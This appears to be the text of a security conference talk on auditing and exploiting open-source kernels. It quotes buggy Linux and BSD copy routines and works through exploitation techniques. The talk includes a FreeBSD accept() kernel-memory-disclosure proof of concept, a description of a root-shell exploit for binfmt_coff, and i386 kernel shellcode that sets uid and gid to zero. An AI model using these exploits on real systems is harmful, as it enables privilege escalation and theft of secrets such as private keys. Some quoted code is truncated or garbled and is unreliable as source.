{ 
        struct lfs_bmapv_args /* { 
                syscallarg(fsid_t *) fsidp; 
                syscallarg(struct block_info *) blkiov; 
                syscallarg(int) blkcnt; 
        } */ *uap = v; 
[ skip ] 
        start = blkp = malloc(cnt * sizeof(BLOCK_INFO), M_SEGMENT, 
M_WAITOK); 
        error = copyin(SCARG(uap, blkiov), blkp, cnt * sizeof(BLOCK_INFO)); 
        if (error) { 
                free(blkp, M_SEGMENT); 
                return (error); 
        } 
        for (step = cnt; step--; ++blkp) { 
compat/hpux/hpux_compat.c
struct hpux_sys_utssys_args { 
        syscallarg(struct hpux_utsname *) uts; 
        syscallarg(int) dev; 
        syscallarg(int) request; 
}; 
./compat/hpux/hpux_compat.c 
int 
hpux_sys_utssys(p, v, retval) 
        struct proc *p; 
        void *v; 
        register_t *retval; 
{ 
        struct hpux_sys_utssys_args *uap = v; 
[ skip ] 
        /* gethostname */ 
        case 5: 
                /* SCARG(uap, dev) is length */ 
                if (SCARG(uap, dev) > hostnamelen + 1) 
                        SCARG(uap, dev) = hostnamelen + 1; 
                error = copyout((caddr_t)hostname, (caddr_t)SCARG(uap, uts), 
                                SCARG(uap, dev)); 
                break; 
pci_hotplug_core.c
static ssize_t power_write_file (struct file *file, const char *ubuff, size_t 
count, loff_t *offset) 
{ 
        struct hotplug_slot *slot = file->private_data; 
        char *buff; 
        unsigned long lpower; 
        u8 power; 
        int retval = 0; 
        if (*offset private_data; 
        ssize_t bcount; 
        size_t alignfix; 
        int off = (int)*offset; /* avoid useless 64bit-arithmetic */ 
        ssize_t retval; 
        void *membase; 
        if ((off + count) > PCILYNX_MAX_MEMORY + 1) { 
                count = PCILYNX_MAX_MEMORY + 1 - off; 
        } 
        if (count == 0) { 
                return 0; 
        } 
[ skip ] 
        if (bcount) { 
                memcpy_fromio(md->lynx->mem_dma_buffer + count - bcount, 
                              membase+off, bcount); 
        } 
 out: 
        retval = copy_to_user(buffer, md->lynx->mem_dma_buffer, count); 
amdtp.c
static ssize_t amdtp_write(struct file *file, const char *buffer, size_t 
count, loff_t *offset_is_ignored) 
{ 
        int i, length; 
[ skip ] 
        for (i = 0; i input, count, &length); 
                copy_from_user(p, buffer + i, length); 
static unsigned char *buffer_put_bytes(struct buffer *buffer, 
                            int max, int *actual) 
{ 
        int length; 
[ skip ] 
        p = &buffer->data[buffer->tail]; 
        length = min(buffer->size - buffer->length, max); 
        if (buffer->tail + length size) { 
                *actual = length; 
                buffer->tail += length; 
        } 
        else { 
                *actual = buffer->size - buffer->tail; 
                 buffer->tail = 0; 
        } 
        buffer->length += *actual; 
        return p; 
net/ipv4/route.c
#ifdef CONFIG_PROC_FS 
static int ip_rt_acct_read(char *buffer, char **start, off_t offset, 
                           int length, int *eof, void *data) 
{ 
        *start=buffer; 
        if (offset + length > sizeof(ip_rt_acct)) { 
                length = sizeof(ip_rt_acct) - offset; 
                *eof = 1; 
        } 
        if (length > 0) { 
                start_bh_atomic(); 
                memcpy(buffer, ((u8*)&ip_rt_acct)+offset, length); 
                end_bh_atomic(); 
                return length; 
        } 
        return 0; 
} 
#endif 
net/core/sock.c
        int lv=sizeof(int),len; 
        if(get_user(len,optlen)) 
                return -EFAULT; 
[ skip ] 
                case SO_PEERCRED: 
                        lv=sizeof(sk->peercred); 
                        len=min(len, lv); 
                        if(copy_to_user((void*)optval, &sk->peercred, len)) 
                                return -EFAULT; 
                        goto lenout; 
[ skip ] 
        len=min(len,lv); 
        if(copy_to_user(optval,&v,len)) 
                return -EFAULT; 
kernel/mtrr.c
static ssize_t mtrr_write (struct file *file, const char *buf, size_t len, 
                           loff_t *ppos) 
/*  Format of control line: 
    "base=%lx size=%lx type=%s"     OR: 
    "disable=%d" 
*/ 
{ 
    int i, err; 
    unsigned long reg, base, size; 
    char *ptr; 
    char line[LINE_SIZE]; 
    if ( !suser () ) return -EPERM; 
    /*  Can't seek (pwrite) on this device  */ 
    if (ppos != &file->f_pos) return -ESPIPE; 
    memset (line, 0, LINE_SIZE); 
    if (len > LINE_SIZE) len = LINE_SIZE; 
    if ( copy_from_user (line, buf, len - 1) ) return -EFAULT; 
usb/rio50.c
struct RioCommand { 
        short length; 
ioctl_rio(struct inode *inode, struct file *file, unsigned int cmd, 
          unsigned long arg) 
[ skip ] 
        switch (cmd) { 
        case RIO_RECV_COMMAND: 
                data = (void *) arg; 
                if (data == NULL) 
                        break; 
                copy_from_user_ret(&rio_cmd, data, sizeof(struct RioCommand), 
                                   -EFAULT); 
                if (rio_cmd.length > PAGE_SIZE) 
                        return -EINVAL; 
                buffer = (unsigned char *) __get_free_page(GFP_KERNEL); 
                if (buffer == NULL) 
                        return -ENOMEM; 
                copy_from_user_ret(buffer,rio_cmd.buffer,rio_cmd.length, 
                                   -EFAULT); 
pcbit/drv.c
int len 
[ skip ] 
        switch(dev->l2_state) { 
        case L2_LWMODE: 
                /* check (size  BANK4 + 1) 
                { 
                        printk("pcbit_writecmd: invalid length %d\n", len); 
                        return -EFAULT; 
                } 
                if (user) 
                { 
                        u_char cbuf[1024]; 
                        copy_from_user(cbuf, buf, len); 
                        for (i=0; ish_mem + i); 
                } 
                else 
                        memcpy_toio(dev->sh_mem, buf, len); 
                return len; 
char/buz.c
zoran_ioctl 
if (vw.clipcount) { 
vcp = vmalloc(sizeof(struct video_clip) * (vw.clipcount + 4)); 
if (vcp == NULL) { 
return -ENOMEM; 
} 
if (copy_from_user(vcp, vw.clips, sizeof(struct 
video_clip) * vw.clipcount)) { 
kernel/mtrr.c
static ssize_t mtrr_read (struct file *file, char *buf, size_t len, 
                          loff_t *ppos) 
{ 
    if (*ppos >= ascii_buf_bytes) return 0; 
    if (*ppos + len > ascii_buf_bytes) len = ascii_buf_bytes - *ppos; 
    // if size_t is 64bit, then *ppos + len integer overflow - Silvio 
    if ( copy_to_user (buf, ascii_buffer + *ppos, len) ) return -EFAULT; 
    *ppos += len; 
    return len; 
}   /*  End Function mtrr_read  */ 
Pause for Audience
Participation!
Questions?
Part (iii)
Kernel Exploitation.
Exploit Classes
• Arbitrary code execution.
– Root shell.  Eg, Linux binfmt_coff.c
– Escape kernel sandboxing.
• Eg, SE Linux, UML.
• Information Disclosure.
– Kernel memory.  Eg, FreeBSD accept().
• Eg, SSH private key.
Prior Work
• Exploitation of kernel stack smashing by
Noir.
– Smashing the Kernel Stack for Fun and
Profit, Phrack 60.
– Implementation of exploit from OpenBSD
select() kernel stack overflow.
Kernel Implementation
• All major Open Source Kernels in C
programming language.
• Language pitfalls are C centric, not
kernel or user land centric.
• No need to understand in-depth kernel
algorithms, if implementation is target of
attack.
C Language Pitfalls
• C language has undefined behaviour in
certain states.
– Eg, Out of bounds array access.
• Undefined, generally means exploitable.
• Error handling hard or difficult.
– No carry or overflow sign or exception handling in
integer arithmetic.
– Return value of functions often both indicate error
and success depending on [ambiguous] context.
• Eg, malloc(), lseek()
C Language Implementation
Bugs
• Integer problems rampant in all code.
• Poor error handling rampant in most
code.
– Does anyone ever check for out of
memory?
– Does anyone ever then try to recover?
– Hard crashes, or memory leaks often the
final result.
Kernel interfaces to target
• Kernel buffer copies.
– Kernel to User space copies.
– User to Kernel space copies.
Kernel Buffer Copying
• Kernel and user space divided into
[conceptual] segments.
– Eg, 3g/1g user/kernel (default i386 Linux).
• Validation required of buffer source and
destination.
– Segments.
– Page present, page permissions etc.
• Incorrect input validation can lead to kernel
compromise.
– Tens or hundreds in each kernel discovered.
Kernel Buffers (1)
• Kernel to user space copies.
– May allow kernel memory disclosure, via
unbounded copying, directly to user space buffers.
• Partial copies of kernel memory possible,
through MMU page fault.
• Verification of page permissions not done
prior to copy.
– In Linux, verify_area() is mostly deprecated for this
use.
FreeBSD sys_accept()
Exploitation
char buf[1024*1024*1024]; 
int main(int argc, char *argv[]) { 
int s1, s2; 
int ret; 
int fromlen; 
struct sockaddr_in *from = (void *)buf; 
if (argc != 2) exit(1); 
fromlen = INT_MAX; 
fromlen++; 
s1 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
assert(s1 != -1); 
from->sin_addr.s_addr = INADDR_ANY; 
from->sin_port = htons(atoi(argv[1])); 
from->sin_family = AF_INET; 
ret = bind(s1, (struct sockaddr *)from, sizeof(*from)); 
assert(ret == 0); 
ret = listen(s1, 5); 
assert(ret == 0); 
s2 = accept(s1, (struct sockaddr *)from, &fromlen); 
write(1, from, BUFSIZE); 
exit(0); 
} 
Kernel Buffers (2)
• Copy optimisation.
• Identified by double underscore.
– Eg, __copy_to_user.
• Assume segment validation prior to
buffer copy.
• Exploitable if [segment] assumptions
are incorrect.
[classic] Exploitation (1)
• Copy kernel shell code from user buffer
to target in kernel segment.
• Target destination a [free] system call.
• Kernel shell code to change UID of
current task to zero (super user).
• System call now a [classic] backdoor.
Exploitation
• Privilege escalation.
– Manipulation of task structure credentials.
– Jail escape not documented in this
presentation.
• See Phrack 60.
• Kernel continuation.
– Noir’s approach in Phrack 60 to return into
kernel [over] complex.
Kernel Stacks
• Linux 2.4 current task pointer, relative to
kernel stack pointer.
• Task is allocated two pages for stack.
– Eg, i386 is 8K.
– Bad practice to allocate kernel buffers on
stack due to stack size limitations.
• Task structure is at top of stack.
– current = %esp & ~(8192-1)
ret_from_sys_call (1)
• Linux i386 implements return to user
land context change with a call gate
(iret).
– Linux/arch/i386/arch/entry.S
entry.S
ENTRY(system_call) 
        pushl %eax                      # save orig_eax 
        SAVE_ALL 
        GET_CURRENT(%ebx) 
        testb $0x02,tsk_ptrace(%ebx)    # PT_TRACESYS 
        jne tracesys 
        cmpl $(NR_syscalls),%eax 
        jae badsys 
        call *SYMBOL_NAME(sys_call_table)(,%eax,4) 
        movl %eax,EAX(%esp)             # save the return value 
ENTRY(ret_from_sys_call) 
        cli                             # need_resched and signals atomic test 
        cmpl $0,need_resched(%ebx) 
        jne reschedule 
        cmpl $0,sigpending(%ebx) 
        jne signal_return 
restore_all: 
        RESTORE_ALL 
ret_from_sys_call (2)
• Kernel stack smashing, exploitation and
returning back into kernel.
– Too many things to figure out!
– Not necessary!
• Change context to user land after kernel
exploitation.
– Emulate ret_from_sys_call.
[classic] Exploitation (2)
• Linux/fs/binfmt_coff.c exploitation.
– Buggy code that would panic if used.
– Public(?) exploit since Ruxcon, still no fix.
• Allows for arbitrary copy from user
space (disk) to kernel.
• Exploitation through custom binary, to
execute shell running as super user.
fs/binfmt_coff.c
fs/binfmt_coff.c 
status = do_brk(text.vaddr, text.size); 
bprm->file->f_op->read(bprm->file, 
(char *)data.vaddr, data.scnptr, &pos); 
status = do_brk(data.vaddr, data.size); 
bprm->file->f_op->read(bprm->file, 
(char *)text.vaddr, text.scnptr, &pos); 
vaddr and scnptr are the virtual addresses and the file offsets 
for the relevant binary sections.  Note that the vaddr has no 
sanity checking in either case above. 
include/linux/fs.h 
        ssize_t (*read) (struct file *, char *, size_t, loff_t *); 
Kernel stack smashing (1)
• Kernel shell code not in kernel segment.
– Lives in user space, runs in kernel context.
• Smash stack with return address to user land
segment.
– Assume alignment [correctly] where return
address on stack.
• Elevate privileges of the current task.
• Ret_from_sys_call.
– Likely to return to user space, then execute a shell,
at elevated privileges.
Shellcode
        __asm__ volatile ( 
                "andw $~8191,%sp        \n"     // current task_struct 
                "xorl %ebx,%ebx         \n" 
                "movl %ebx,300(%esp)    \n"     // uid (300) 
                "movl %ebx,316(%esp)    \n"     // gid (316) 
                "cli                    \n" 
                "pushl $0x2b            \n"     // 
                "pop %ds                \n"     // 
                "pushl %ds              \n"     // oldss (ss == ds) 
                "pushl $0xc0000000      \n"     // oldesp 
                "pushl $0x246           \n"     // eflags 
                "pushl $0x23            \n"     // cs 
                "pushl $shellcode       \n"     // eip of userspace shellcode 
                "iret                   \n" 
        ); 
Kernel Stack Smashing (2)
• Full overwrite of return address not
always possible.
• Return address may point to trampoline.
• Trampoline may be a jump to an
atypical address in user land.
• Address may be become available
using mmap().
Future Work
• SELinux, UML exploit implementation.
• Heap bugs with the kernel memory
allocator(s).
– Buffer overflows.
– Double frees.
That’s all folks!
Questions?